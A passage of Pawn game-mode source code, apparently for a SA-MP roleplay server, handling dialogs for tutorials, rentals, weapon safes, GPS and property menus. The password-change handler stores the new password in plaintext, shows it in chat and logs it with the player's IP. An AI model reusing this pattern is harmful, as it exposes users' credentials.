        		TimerLearn[ playerid ] = SetTimerEx( "CityTut", 1000, 0, "ii", playerid, 1);
				SCM( playerid, SVETLOCRVENA, "Netocan odgovor.Slijedi tutorijal ponovno!" );
				SCM( playerid, SVETLOCRVENA, "Ukoliko vam i dalje ne bude jasno odgovore na pitanja mozete pronaci na nasem forumu www.valhalla-ogc.com" );
			}
		}
		else {
		    PlayerInfo[ playerid ][ xRPLearn ] = 1;
     		SavePlayer( playerid );
     		Novi_KillTimer( TimerPitanje[ playerid ] );
     		TogglePlayerControllable( playerid, false );
       		TimerLearn[ playerid ] = SetTimerEx( "CityTut", 1000, 0, "ii", playerid, 1);
			SCM( playerid, SVETLOCRVENA, "Netocan odgovor.Slijedi tutorijal ponovno!" );
			SCM( playerid, SVETLOCRVENA, "Ukoliko vam i dalje ne bude jasno odgovore na pitanja mozete pronaci na nasem forumu www.valhalla-ogc.com" );
		}
	}
	else if( dialogid == dialog_CHANGEPASSWORD ) {
	    if( response ) {
	        if( strlen(inputtext) < 6 || strlen(inputtext) > 20 ) {
	    		SendErrorMessage( playerid, "Password moze sadrzavati minimalno 6 a maximalno 20 znakova" );
			    return 1;
			}
		    else {
				strmid( PlayerInfo[ playerid ][ xLozinka ], inputtext, 0, strlen( inputtext ), 255 );
				format( globalstring, sizeof( globalstring ), "Nova lozinka: %s", inputtext );
				SCM( playerid, ZUTA, globalstring );
				SavePlayer( playerid );
				format( globalstring, sizeof( globalstring ), "Prijavite se ponovno sa novom lozinkom: %s", inputtext );
				Kickovanje( playerid, globalstring );
				
				new playersip[ 128 ];
       			GetPlayerIp( playerid, playersip, sizeof( playersip ) );
       			
				new string[ 128 ]; 
				format( string, sizeof( string ), "IP: %s | Igrac %s je promenio lozinku na %d", playersip, ImeIgraca( playerid ), inputtext );
				LogSave( "Ostalo/LogPromenaLozinke.log", string );
    		}
	    }
	}
	else if( dialogid == dialog_RENTANJE ) {
		if( response ) {
	        new price;
	        new engine, lights, alarm, doors, bonnet, boot, objective;
	        GetVehicleParamsEx( GetPlayerVehicleID( playerid ), engine, lights, alarm, doors, bonnet, boot, objective );
			if( IsVehicleBajs( GetPlayerVehicleID( playerid ) ) ) price = 150;
			else if( IsVehicleMotor( GetPlayerVehicleID( playerid ) ) ) price = 250;
			else if( IsVehicleAuto( GetPlayerVehicleID( playerid ) ) ) price = 350;
	        if( Rentano[ playerid ] != -1 ) return SendErrorMessage( playerid, "Vec si rentao neko vozilo."), Novi_RemovePlayerFromVehicle( playerid ), TogglePlayerControllable( playerid, true );
	        if( !IsPlayerInAnyVehicle(playerid)) return SendErrorMessage( playerid, "Morate biti u vozilu!");
			if( GetPlayerState(playerid) != PLAYER_STATE_DRIVER ) return SendErrorMessage( playerid, "Morate biti na mjestu vozaca!");
	        foreach( Player, i ) {
		        if( Rentano[ i ] == GetPlayerVehicleID( playerid ) ) {
		     		SendErrorMessage( playerid, "To vozilo je vec rentano!" );
		     		Novi_RemovePlayerFromVehicle( playerid ); TogglePlayerControllable( playerid, true );
		     		return 1;
		       	}
		    }
		    if( PlayerInfo[ playerid ][ xNovac ] < price ) return SendErrorMessage( playerid, "Nemas dovoljno novca(%d$)!", price ), Novi_RemovePlayerFromVehicle( playerid ), TogglePlayerControllable( playerid, true );
		    DajIgracuNovac( playerid, -price );
		    Rentano[ playerid ] = GetPlayerVehicleID( playerid );
		    RentTimer[ playerid ] = SetTimerEx( "KrajRenta", 600000, 0, "ii", playerid, GetPlayerVehicleID( playerid ) );
		    if( IsVehicleBajs( GetPlayerVehicleID( playerid ) ) ) {
				SetVehicleParamsEx( GetPlayerVehicleID( playerid ), 1, lights, alarm, doors, bonnet, boot, objective );
				SCM( playerid, ZUTA, "Rentao si biciklu sada mozete krenuti, rent je 10 minuta!");
			}
			else if( IsVehicleMotor( GetPlayerVehicleID( playerid ) ) ) {
				SCM( playerid, ZUTA, "Rentao si motor sada ga mozes upaliti, rent je 10 minuta!");
			}
			else if( IsVehicleAuto( GetPlayerVehicleID( playerid ) ) ) {
				SCM( playerid, ZUTA, "Rentao si vozilo sada ga mozes upaliti, rent je 10 minuta!");
			}
			BussinesRentMoney( playerid, price/2 );
	    }
	    else {
	        Novi_RemovePlayerFromVehicle( playerid ); TogglePlayerControllable( playerid, true );
	        SCM( playerid, CRVENA, "Odbio si rentanje vozila!");
	    }
	}
	else if( dialogid == dialog_PROPERTYWEPTAKE ) {
	    new wepname[ 32 ];
	    if( response == 1 )
	    {
	        switch( listitem )
	        {
	            case 0:
	            {
	                if( II[ PropertySafeGun[ playerid ] ][ iOruzje ][ 0 ] == 0)
	                {
	                    SendErrorMessage( playerid, "Nemate oruzja u tom slotu.");
	                    return 1;
	                }

	                format( wepname, sizeof( wepname ), "%s", WeapNames[ II[ PropertySafeGun[ playerid ] ][ iOruzje ][ 0 ] ] );
                    antiCheatCS[ playerid ][ WeaponDetect ] = 3;
	                GiveWeaponToPlayer( playerid, II[ PropertySafeGun[ playerid ] ][ iOruzje ][ 0 ], II[ PropertySafeGun[ playerid ] ][ iMunicija ][ 0 ] );
	                II[ PropertySafeGun[ playerid ] ][ iOruzje ][ 0 ] = 0;
	                II[ PropertySafeGun[ playerid ] ][ iMunicija ][ 0 ] = 0;
	                SaveProperty( PropertySafeGun[ playerid ] );

					format( globalstring, sizeof( globalstring ), "* %s vadi %s iz sefa.", ImeIgraca( playerid ), wepname );
					PorukaRadius(5, playerid, globalstring, LJUBICASTA );
	            }
	            case 1:
	            {
           	 		if( II[ PropertySafeGun[ playerid ] ][ iOruzje ][ 1 ] == 0)
	                {
	                    SendErrorMessage( playerid, "Nemate oruzja u tom slotu.");
	                    return 1;
	                }

	                format( wepname, sizeof( wepname ), "%s", WeapNames[ II[ PropertySafeGun[ playerid ] ][ iOruzje ][ 1 ] ] );
                    antiCheatCS[ playerid ][ WeaponDetect ] = 3;
	                GiveWeaponToPlayer( playerid, II[ PropertySafeGun[ playerid ] ][ iOruzje ][ 1 ], II[ PropertySafeGun[ playerid ] ][ iMunicija ][ 1 ] );
	                II[ PropertySafeGun[ playerid ] ][ iOruzje ][ 1 ] = 0;
	                II[ PropertySafeGun[ playerid ] ][ iMunicija ][ 1 ] = 0;
	                SaveProperty( PropertySafeGun[ playerid ] );

					format( globalstring, sizeof( globalstring ), "* %s vadi %s iz sefa.", ImeIgraca( playerid ), wepname );
					PorukaRadius(5, playerid, globalstring, LJUBICASTA );
	            }
	            case 2:
	            {
           	 		if( II[ PropertySafeGun[ playerid ] ][ iOruzje ][ 2 ] == 0)
	                {
	                    SendErrorMessage( playerid, "Nemate oruzja u tom slotu.");
	                    return 1;
	                }

	                format( wepname, sizeof( wepname ), "%s", WeapNames[ II[ PropertySafeGun[ playerid ] ][ iOruzje ][ 2 ] ] );
                    antiCheatCS[ playerid ][ WeaponDetect ] = 3;
	                GiveWeaponToPlayer( playerid, II[ PropertySafeGun[ playerid ] ][ iOruzje ][ 2 ], II[ PropertySafeGun[ playerid ] ][ iMunicija ][ 2 ] );
	                II[ PropertySafeGun[ playerid ] ][ iOruzje ][ 2 ] = 0;
	                II[ PropertySafeGun[ playerid ] ][ iMunicija ][ 2 ] = 0;
	                SaveProperty( PropertySafeGun[ playerid ] );

					format( globalstring, sizeof( globalstring ), "* %s vadi %s iz sefa.", ImeIgraca( playerid ), wepname );
					PorukaRadius(5, playerid, globalstring, LJUBICASTA );
				}
				case 3:
	            {
           	 		if( II[ PropertySafeGun[ playerid ] ][ iOruzje ][ 3 ] == 0)
	                {
	                    SendErrorMessage( playerid, "Nemate oruzja u tom slotu.");
	                    return 1;
	                }

	                format( wepname, sizeof( wepname ), "%s", WeapNames[ II[ PropertySafeGun[ playerid ] ][ iOruzje ][ 3 ] ] );
                    antiCheatCS[ playerid ][ WeaponDetect ] = 3;
	                GiveWeaponToPlayer( playerid, II[ PropertySafeGun[ playerid ] ][ iOruzje ][ 3 ], II[ PropertySafeGun[ playerid ] ][ iMunicija ][ 3 ] );
	                II[ PropertySafeGun[ playerid ] ][ iOruzje ][ 3 ] = 0;
	                II[ PropertySafeGun[ playerid ] ][ iMunicija ][ 3 ] = 0;
	                SaveProperty( PropertySafeGun[ playerid ] );

					format( globalstring, sizeof( globalstring ), "* %s vadi %s iz sefa.", ImeIgraca( playerid ), wepname );
					PorukaRadius(5, playerid, globalstring, LJUBICASTA );
				}
	        }
		}
	}
	else if( dialogid == dialog_CREATEEVENT ) {
	    if( !response ) return 1;
	    format( EventName[ playerid ], 64, "%s", inputtext );
		SPD( playerid, dialog_CREATEEVENT2, DSI, D_NASLOV, "Unesti ID vozila za event", D_ODABERI, D_ODUSTANI );
	}
	else if( dialogid == dialog_CREATEEVENT2 ) {
	    if( !response ) return 1;
	    EventCarsCreate[ playerid ] = 1;
	    EventCP[ playerid ] = 1;
	    EventVehID[ playerid ] = strval( inputtext );
	    SCM( playerid, ZUTA, "Koristi LMB da postavis 2 reda vozila.");
	    SCM( playerid, ZUTA, "Prvo snimanje prvi red vozila, drugo snimanje drugi red vozila.");
	}
	else if( dialogid == dialog_EVENTSTART ) {
	    if( !response ) return 1;
	    if( response ) {
	        new gFile[ 35 ];
			format( gFile, 35, EVENT_FILE, strval( inputtext ) );
			if( !fexist( gFile ) ) return SendErrorMessage( playerid, "Uneli ste broj eventa koji nepostoji." );
        	if( EventInfo[ eID ] != 0 ) return SendErrorMessage( playerid, "Vec je ukljucen jedan event, koristi /eugasi." );
			EventInfo[ eID ] = strval( inputtext );
			EventInfo[ EventTime ] = MAX_TIME;
			EventInfo[ Drivers ] = 0;

			Event[ EventInfo[ eID ] ][ PrivremeniX1 ] = Event[ EventInfo[ eID ] ][ TCPX ];
	 		Event[ EventInfo[ eID ] ][ PrivremeniY1 ] = Event[ EventInfo[ eID ] ][ TCPY ];
	 		Event[ EventInfo[ eID ] ][ PrivremeniX2 ] = Event[ EventInfo[ eID ] ][ TCPX2 ];
	 		Event[ EventInfo[ eID ] ][ PrivremeniY2 ] = Event[ EventInfo[ eID ] ][ TCPY2 ];

			format( globalstring, sizeof( globalstring ), ""col_orange"%s Event | "col_white"je poceo, imate {A6A6A6}20"col_white" sekundi da se pridruzite {A6A6A6}[ /join ]", Event[ strval( inputtext ) ][ Name ] );
			SCMA( -1, globalstring );
	        format( globalstring, sizeof( globalstring ), "***[Ucitavanje trke] %s | %s", ImeIgraca( playerid ), Event[ strval( inputtext ) ][ Name ] );
			AdminPoruka( 0x6495EDAA, globalstring );
		}
	}

	else if( dialogid == dialog_GPS_FIND ) {
	    pMappedType[ playerid ] = MAPPED_NONE;
	    if( !response ) return true;

	    dStyle = DSL;
		strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );

	    switch( listitem ) {
	        case 0: {
	            
                new string[128], BigString[2000];
                for(new id = 0; id < MAX_PORTING; id++)
                {
                    new wFile[40];
                    format(wFile, 40, PORTING_FILE, id);
                    if(fexist(wFile))
                    {
                        if(portInfo[id][portVrsta] == 1) {

                            format(string, sizeof(string), "%s\n", portInfo[id][portIme]);
                            strcat(BigString, string);
                        }
                    }
                }
                if(isnull(BigString)) return SendErrorMessage(playerid, "Nema kreiranih portova!");

                ShowPlayerDialog(playerid, dialog_selectGPS, dStyle, "Odaberi Lokaciju", BigString, "Odaberi", "Odustani");

	        }
			case 1: {
			    pMappedType[ playerid ] = MAPPED_HOUSE;
				SPD( playerid, dialog_GPS, DSI, "Izaberi lokaciju.", "Unesite id imovine do koje zelite da odete.", D_ODABERI, D_ODUSTANI );
			}
			case 2: {
			    pMappedType[ playerid ] = MAPPED_BUSINESS;
			    SPD( playerid, dialog_GPS, DSI, "Izaberi lokaciju.", "Unesite id firme do koje zelite da odete.", D_ODABERI, D_ODUSTANI );
			}
			case 3: {
				new string[128], BigString[2000];
                for(new id = 0; id < MAX_PORTING; id++)
                {
                    new wFile[40];
                    format(wFile, 40, PORTING_FILE, id);
                    if(fexist(wFile))
                    {
                        if(portInfo[id][portVrsta] == 2) {

                            format(string, sizeof(string), "%s\n", portInfo[id][portIme]);
                            strcat(BigString, string);
                        }
                    }
                }
                if(isnull(BigString)) return SendErrorMessage(playerid, "Nema kreiranih portova!");

                ShowPlayerDialog(playerid, dialog_selectGPS, DIALOG_STYLE_LIST, "Odaberi Lokaciju", BigString, "Odaberi", "Odustani");
			}
		}
		return true;
	}
	else if( dialogid == dialog_GPS ) {
	    if( !response ) return true;

		switch( pMappedType[ playerid ] ) {
		    case MAPPED_IMPORTANT: {
		        listitem++;
				setPlayerGps( playerid, gpsInfo[ listitem ][ gpsPos ][ 0 ], gpsInfo[ listitem ][ gpsPos ][ 1 ], gpsInfo[ listitem ][ gpsPos ][ 2 ] );
			}
			case MAPPED_HOUSE: {
			    pMappedType[ playerid ] = MAPPED_HOUSE;
			    new broj, filename[ 64 ];
			    if( sscanf( inputtext, "d", broj ) ) return SPD( playerid, dialog_GPS, DSI, "Izaberi lokaciju.", "Unesite id imovine do koje zelite da odete.", D_ODABERI, D_ODUSTANI );
                format( filename, sizeof( filename ), IM_FILE, broj );
				if( !fexist( filename ) ) return SendErrorMessage( playerid, "ID te imovine ne postoji u bazi podataka!" );
				setPlayerGps( playerid, II[ broj ][ iEnter ][ 0 ], II[ broj ][ iEnter ][ 1 ], II[ broj ][ iEnter ][ 2 ] );
			}
			case MAPPED_JOB: {
                setPlayerGps( playerid, jobsInfos[ listitem ][ jPos ][ 0 ], jobsInfos[ listitem ][ jPos ][ 1 ], jobsInfos[ listitem ][ jPos ][ 2 ] );
			}
			case MAPPED_BUSINESS: {
			    pMappedType[ playerid ] = MAPPED_BUSINESS;
			    new broj, filename[ 64 ];
			    if( sscanf( inputtext, "d", broj ) ) return SPD( playerid, dialog_GPS, DSI, "Izaberi lokaciju.", "Unesite id firme do koje zelite da odete.", D_ODABERI, D_ODUSTANI );
                format( filename, sizeof( filename ), F_FILE, broj );
				if( !fexist( filename ) ) return SendErrorMessage( playerid, "ID te firme ne postoji u bazi podataka!" );
				setPlayerGps( playerid, BussinesInfo[ broj ][ bEnterX ], BussinesInfo[ broj ][ bEnterY ], BussinesInfo[ broj ][ bEnterZ ] );
			}
		}
	}
	
	else if( dialogid == dialog_DOGLAS ) {
	    if( !response ) return 1;
		if( response ) {
		    new CHB = 5;
		    if( PlayerInfo[ playerid ][ xVIPLevel ] < CHB ) return SendErrorMessage( playerid, "Nemate dovoljno bodova." );
		    new text[ 128 ];
			if( sscanf( inputtext, "s[128]", text ) ) return SPD( playerid, dialog_DOGLAS, DSI, D_NASLOV, "Unesi oglas koji zelite da objavite", D_ODABERI, D_ODUSTANI );
		    format( globalstring, sizeof( globalstring ), "Oglas: %s, Kontakt: %s Broj: %d",  text, ImeIgraca( playerid ), PlayerInfo[ playerid ][ xBrojTelefona ] );
			OOCNews( 0x00D900C8, globalstring );
			PlayerInfo[ playerid ][ xBrojTelefona ] = strval( inputtext );
			SavePlayer( playerid );
			SCM( playerid, SVETLOCRVENA, "Dali ste oglas za bodove!" );
        }
	}
	else if( dialogid == dialog_IZMENABROJA ) {
	    if( !response ) return 1;
		if( response ) {
		    new CHB = 10;
            if( strlen( inputtext ) != 6 ) return SendErrorMessage( playerid, "Mora biti samo 6 cifara!" );
			if( PlayerInfo[ playerid ][ xVIPLevel ] < CHB ) return SendErrorMessage( playerid, "Nemate dovoljno bodova.");
            if( !IsNumeric( inputtext ) ) return SendErrorMessage( playerid, "Moze samo brojevi." );
			if( strval( inputtext ) < 100000 ) return SendErrorMessage( playerid, "Pogresan broj." );
			PlayerInfo[ playerid ][ xVIPLevel ] -= CHB;
			PlayerInfo[ playerid ][ xBrojTelefona ] = strval( inputtext );
			SavePlayer( playerid );
			SendClientMessageEx( playerid, SVETLOCRVENA, "Promenili ste broj u "col_white"%s!", inputtext );
			SendClientMessageEx( playerid, CRVENA, "Iskoristili ste %d CHB imate još %d CHB.", CHB, PlayerInfo[ playerid ][ xVIPLevel ] );
		}
	}
	else if( dialogid == dialog_EMAIL ) {
	    if( !response ) return 1;
		if( response ) {
		    new CHB = 50;
			if( PlayerInfo[ playerid ][ xVIPLevel ] < CHB ) return SendErrorMessage( playerid, "Nemate dovoljno bodova.");
            new mailstring = strfind( inputtext, "@", true ), tackastring = strfind( inputtext, ".", true );
	        if( mailstring == -1 || tackastring == -1 ) {
	            SPD( playerid, dialog_EMAIL, DSI, D_NASLOV, "U prazni prostor ispod unesite vasu e-mail adresu.\nE-mail adresa ce nam posluziti u vracanju vasih passworda.(Bez maila nema vracanja passworda)", "Unos", "Izlaz");
			}
			PlayerInfo[ playerid ][ xVIPLevel ] -= CHB;
			strmid( PlayerInfo[ playerid ][ xEmail ], inputtext, 0, strlen( inputtext ), 34 );
			SavePlayer( playerid );
			SendClientMessageEx( playerid, SVETLOCRVENA, "Promenili ste email u "col_white"%s!", inputtext );
			SendClientMessageEx( playerid, CRVENA, "Iskoristili ste %d CHB imate još %d CHB.", CHB, PlayerInfo[ playerid ][ xVIPLevel ] );
		}
	}
	else if( dialogid == dialog_PROPERTYLIST ) {
	    if( !response ) return 1;
	    if( response ) {
	        switch( listitem ) {
				case 0: {
				    if( PlayerInfo[ playerid ][ xProperty ][ 0 ] == -1 ) return SendErrorMessage( playerid, "Nemate imovinu u slotu 1." );
					if( strcmp( ImeIgraca( playerid ), II[ PlayerInfo[ playerid ][ xProperty ][ 0 ] ][ iOwner ], true) == 0 ) {
						ChosenProperty[ playerid ] = PlayerInfo[ playerid ][ xProperty ][ 0 ];
						SPD( playerid, dialog_PROPCHOSEN, DSL, D_NASLOV, "Informacije\nZakljucaj/Otkljucaj\nUnapredi\nOrmar\nSef\n{F81414}Prodaj drzavi\n{F81414}Prodaj igracu\n{FFFFFF}Rentanje\nUzimanje novca\nOstavljanje novca", D_ODABERI, D_ODUSTANI );
					} else SendErrorMessage( playerid, "Ovo nije vase.." );
				}
				case 1: {
				    if( PlayerInfo[ playerid ][ xProperty ][ 1 ] == -1 ) return SendErrorMessage( playerid, "Nemate imovinu u slotu 2." );
				    if( strcmp( ImeIgraca( playerid ), II[ PlayerInfo[ playerid ][ xProperty ][ 1 ] ][ iOwner ], true) == 0 ) {
						ChosenProperty[ playerid ] = PlayerInfo[ playerid ][ xProperty ][ 1 ];
						SPD( playerid, dialog_PROPCHOSEN, DSL, D_NASLOV, "Informacije\nZakljucaj/Otkljucaj\nUnapredi\nOrmar\nSef\n{F81414}Prodaj drzavi\n{F81414}Prodaj igracu\n{FFFFFF}Rentanje\nUzimanje novca\nOstavljanje novca", D_ODABERI, D_ODUSTANI );
					} else SendErrorMessage( playerid, "Ovo nije vase.." );
				}
				case 2: {
				    if( PlayerInfo[ playerid ][ xProperty ][ 2 ] == -1 ) return SendErrorMessage( playerid, "Nemate imovinu u slotu 3." );
				    if( strcmp( ImeIgraca( playerid ), II[ PlayerInfo[ playerid ][ xProperty ][ 2 ] ][ iOwner ], true) == 0 ) {
						ChosenProperty[ playerid ] = PlayerInfo[ playerid ][ xProperty ][ 2 ];
						SPD( playerid, dialog_PROPCHOSEN, DSL, D_NASLOV, "Informacije\nZakljucaj/Otkljucaj\nUnapredi\nOrmar\nSef\n{F81414}Prodaj drzavi\n{F81414}Prodaj igracu\n{FFFFFF}Rentanje\nUzimanje novca\nOstavljanje novca", D_ODABERI, D_ODUSTANI );
					} else SendErrorMessage( playerid, "Ovo nije vase.." );
				}
	        }
	    }
	}
	else if( dialogid == dialog_PROPCHOSEN ) {
	    if( !response ) return 1;
	    if( response ) {
	        switch( listitem ) {
				case 0: {
				    new hid = ChosenProperty[ playerid ];
				    if( GetNearestProperty( playerid ) != hid && inProperty[ playerid ] != hid ) return SendErrorMessage( playerid, "Niste pored svoje imovine ili u njoj!" );
				    strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
				    format( globalstring, sizeof( globalstring ), ""col_crvena"%s "col_white"- "col_crvena"ID: "col_white"%d\n\n",  GetPropertyAName( hid ), hid );
					strcat( DialogStrgEx, globalstring);
					
					format( globalstring, sizeof( globalstring ), ""col_crvena"Novac: "col_white"%d\n", II[ hid ][ iMoney ] );
                    strcat( DialogStrgEx, globalstring );
					format( globalstring, sizeof( globalstring ), ""col_crvena"Broj rentova: "col_white"%d\n", II[ hid ][ iRentovano ] );
					strcat( DialogStrgEx, globalstring );
					strcat( DialogStrgEx, ""col_crvena"_____________"col_white"_____________\n" );
				    if( II[ hid ][ iLocked ] == 1 )
						strcat( DialogStrgEx, ""col_crvena"Status vrata: "col_white"Zakljucano\n");
					else
						strcat( DialogStrgEx, ""col_crvena"Status vrata: "col_white"Otkljucano\n");
                    strcat( DialogStrgEx, ""col_crvena"_____________"col_white"_____________\n" );
			        if( II[ hid ][ iLockLevel ] == 0)
						strcat( DialogStrgEx, ""col_crvena"Kvaliteta brave: "col_white"Nekvalitetna\n");
					else {
						format( globalstring, sizeof( globalstring ), ""col_crvena"Kvaliteta brave: "col_white"%d\n",  II[ hid ][ iLockLevel ] );
						strcat( DialogStrgEx, globalstring);
					}
					strcat( DialogStrgEx, ""col_crvena"_____________"col_white"_____________\n" );
			        if( II[ hid ][ iDoorLevel ] == 0 )
						strcat( DialogStrgEx, ""col_crvena"Kvalitet vrata: "col_white"Nekvalitetna\n");
					else {
					    format( globalstring, sizeof( globalstring ), ""col_crvena"Kvalitet vrata: "col_white"%d level\n",  II[ hid ][ iDoorLevel ] );
						strcat( DialogStrgEx, globalstring);
					}
					strcat( DialogStrgEx, ""col_crvena"_____________"col_white"_____________\n" );
					if( II[ hid ][ iOrmar ] > 0) {
					    strcat( DialogStrgEx, ""col_crvena"Ormar: "col_white"Ima\n" );
					} else strcat( DialogStrgEx, ""col_crvena"Ormar: "col_white"Nema\n" );
                    strcat( DialogStrgEx, ""col_crvena"_____________"col_white"_____________\n" );
					if( II[ hid ][ iAlarm ] > 0) {
						format( globalstring, sizeof( globalstring ), ""col_crvena"Alarm level: "col_white"%d",  II[ hid ][ iAlarm ] );
						strcat( DialogStrgEx, globalstring );
					} else strcat( DialogStrgEx, ""col_crvena"Alarm: "col_white"Nema" );
	                SPD( playerid, 0, DSMSG, D_NASLOV, DialogStrgEx, "Potvrdi", "" );
	    			strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ));
				}
				case 1: {
				    new id = ChosenProperty[ playerid ];
				    if( GetNearestProperty( playerid ) != id && inProperty[ playerid ] != id ) return SendErrorMessage( playerid, "Niste pored svoje imovine ili u njoj!" );
			        if( strcmp( ImeIgraca( playerid ), II[ id ][ iOwner ], true) == 0 ) {
				        if( II[ id ][ iLocked ] == 0 ) {
				            II[ id ][ iLocked ] = 1;
			                GameTextForPlayer( playerid, "~w~Imovina ~r~zakljucana", 5000, 6 );
							PlayerPlaySound( playerid, 1145, 0.0, 0.0, 0.0 );
							format( globalstring, sizeof( globalstring ), "* %s zakljucava %s.", ImeIgraca( playerid ), GetPropertyName( id ) );
							PorukaRadius(10.0, playerid, globalstring, LJUBICASTA );
			            }
						else {
						    II[ id ][ iLocked ] = 0;
			                GameTextForPlayer( playerid, "~w~Imovina ~g~otkljucana", 5000, 6 );
							PlayerPlaySound( playerid, 1145, 0.0, 0.0, 0.0 );
							format( globalstring, sizeof( globalstring ), "* %s otkljucava %s.", ImeIgraca( playerid ), GetPropertyName( id ) );
							PorukaRadius(10.0, playerid, globalstring, LJUBICASTA );
						}
					} else SendErrorMessage( playerid, "Ovo nije vase.." );
				}
				case 2: {
				    new id = ChosenProperty[ playerid ];
				    if( inProperty[ playerid ] != id ) return SendErrorMessage( playerid, "Niste u vasoj kuci/stanu/vikendici." );
                    return SendErrorMessage(playerid, "Opcija izbacena!");
				    //SPD( playerid, dialog_PROPUNAPREDI, DSI, D_NASLOV, "Izaberite broj: 1. ormar, 2. sef, 3. alarm, 4. brava, 5. vrata.\nCene:ormar(250$), sef(250$), alarm(500$), brava(300$), vrata(100$)", D_ODABERI, D_ODUSTANI );
				}
				case 3: {
				    new id = ChosenProperty[ playerid ];
				    if( inProperty[ playerid ] != id ) return SendErrorMessage( playerid, "Niste u vasoj kuci/stanu/vikendici." );
				    if( II[ inProperty[ playerid ] ][ iOrmar ] != 1 ) return SendErrorMessage( playerid, "U ovoj imovini nema ormara!");
					if( strcmp( ImeIgraca( playerid ), II[ inProperty[ playerid ] ][ iOwner ], true) == 0 ) {
				    	SPD( playerid, dialog_ORMAR, DSL, D_NASLOV, "Stavi trenutnu odecu u ormar\nUdji u ormar\nIzbaci odecu iz ormara", D_ODABERI, D_ODUSTANI );
				    } else SendErrorMessage( playerid, "Ovo nije vase.." );
				}
				case 4: {
				    new id = ChosenProperty[ playerid ];
				    if( inProperty[ playerid ] != id ) return SendErrorMessage( playerid, "Niste u vasoj kuci/stanu/vikendici." );
					if( strcmp( ImeIgraca( playerid ), II[ inProperty[ playerid ] ][ iOwner ], true) == 0 ) {
				    	SPD( playerid, dialog_SAFEALL, DSL, D_NASLOV, "Informacije\nPromeni lozinku\nOtkljucaj/Zakljucaj\nOstavi drogu\nUzmi drogu\nOstavi oruzje\nUzmi oruzje", D_ODABERI, D_ODUSTANI );
					} else SendErrorMessage( playerid, "Ovo nije vase.." );
				}
				case 5: {
				    new id = ChosenProperty[ playerid ];
				    if( GetNearestProperty( playerid ) != id ) return SendErrorMessage( playerid, "Niste pored svoje imovine!" );
                    if(ProdajeImovinu[playerid]) return SendErrorMessage(playerid, "Ne mozes to dok prodajes igracu!");
			        if( strcmp( ImeIgraca( playerid ), II[ GetNearestProperty( playerid ) ][ iOwner ], true) == 0 ) {
						SPD( playerid, dialog_PROPSELLDRZAVA, DSMSG, D_NASLOV, "Da li ste sigurni da zelite prodati vasu imovinu drzavi?", "Da", "Ne" );

					} else SendErrorMessage( playerid, "Ovo nije vase.." );
				}
				case 6: {
				    new id = ChosenProperty[ playerid ];
				    if( GetNearestProperty( playerid ) != id ) return SendErrorMessage( playerid, "Niste pored svoje imovine!" );
				    SPD( playerid, dialog_PROPSELLTP, DSI, D_NASLOV, "U prazni prostor ispod unesite ID igraca i cenu imovina", "Ponudi", D_ODUSTANI );
				}
				case 7: {
				    new id = ChosenProperty[ playerid ];
				    if( GetNearestProperty( playerid ) != id ) return SendErrorMessage( playerid, "Niste pored svoje imovine!" );
			        if( strcmp( ImeIgraca( playerid ), II[ GetNearestProperty( playerid ) ][ iOwner ], true) == 0 ) {
						
						SPD( playerid, dialog_RENTABLE, DSI, D_NASLOV, "Unesite cenu renta.\nAko uneses 0 nema rentanja u vasoj kuci.\nMaksimalna cena je 1000$", D_ODABERI, D_ODUSTANI );
					} else SendErrorMessage( playerid, "Ovo nije vase.." );
				}
				case 8: {
				    new id = ChosenProperty[ playerid ];
				    if( inProperty[ playerid ] != id ) return SendErrorMessage( playerid, "Niste u vasoj kuci/stanu/vikendici." );
				    SPD( playerid, dialog_PROPTAKEMONEY, DSI, D_NASLOV, "Unesite koliko zelite da uzmete novca iz imovine.", D_ODABERI, D_ODUSTANI );
				}
				case 9: {
				    new id = ChosenProperty[ playerid ];
				    if( inProperty[ playerid ] != id ) return SendErrorMessage( playerid, "Niste u vasoj kuci/stanu/vikendici." );
				    SPD( playerid, dialog_PROPPUTMONEY, DSI, D_NASLOV, "Unesite koliko zelite da ostavite novca u imovine.", D_ODABERI, D_ODUSTANI );
				}
	        }
	    }
	}
	else if( dialogid == dialog_PROPTAKEMONEY ) {
	    if( !response ) return 1;
	    if( response ) {
	        new novac, id = ChosenProperty[ playerid ];
	        if( inProperty[ playerid ] != id ) return SendErrorMessage( playerid, "Niste u vasoj kuci/stanu/vikendici." );
	        if( sscanf( inputtext, "i", novac ) ) return SPD( playerid, dialog_PROPTAKEMONEY, DSI, D_NASLOV, "Unesite koliko zelite da uzmete novca iz imovine.", D_ODABERI, D_ODUSTANI );
			if( novac < 0 || novac > 100000000 ) return SPD( playerid, dialog_PROPTAKEMONEY, DSI, D_NASLOV, "Unesite koliko zelite da uzmete novca iz imovine.", D_ODABERI, D_ODUSTANI );
			if( novac > II[ id ][ iMoney ] ) return SPD( playerid, dialog_PROPTAKEMONEY, DSI, D_NASLOV, "Unesite koliko zelite da uzmete novca iz imovine.", D_ODABERI, D_ODUSTANI );

			II[ id ][ iMoney ] -= novac;
			SaveProperty( id );
			DajIgracuNovacSpeech( playerid, novac );
			SendInfoMessage( playerid, "Uzeli ste %d$ iz sefa.", novac );
		}
	}
	else if( dialogid == dialog_PROPPUTMONEY ) {
	    if( !response ) return 1;
	    if( response ) {
	        new novac, id = ChosenProperty[ playerid ];
	        if( inProperty[ playerid ] != id ) return SendErrorMessage( playerid, "Niste u vasoj kuci/stanu/vikendici." );
	        if( sscanf( inputtext, "i", novac ) ) return SPD( playerid, dialog_PROPPUTMONEY, DSI, D_NASLOV, "Unesite koliko zelite da ostavite novca u imovine.", D_ODABERI, D_ODUSTANI );
			if( novac < 0 || novac > 100000000 ) return SPD( playerid, dialog_PROPPUTMONEY, DSI, D_NASLOV, "Unesite koliko zelite da ostavite novca u imovine.", D_ODABERI, D_ODUSTANI );
			if( novac > PlayerInfo[ playerid ][ xNovac ] ) return SPD( playerid, dialog_PROPPUTMONEY, DSI, D_NASLOV, "Unesite koliko zelite da ostavite novca u imovine.", D_ODABERI, D_ODUSTANI );

			II[ id ][ iMoney ] += novac;
			SaveProperty( id );
			DajIgracuNovacSpeech( playerid, -novac );
			SendInfoMessage( playerid, "Ostavili ste %d$ u sef.", novac );
		}
	}
	else if( dialogid == dialog_RENTABLE ) {
	    if( !response ) return 1;
	    if( response ) {
	        new cena, id = ChosenProperty[ playerid ];
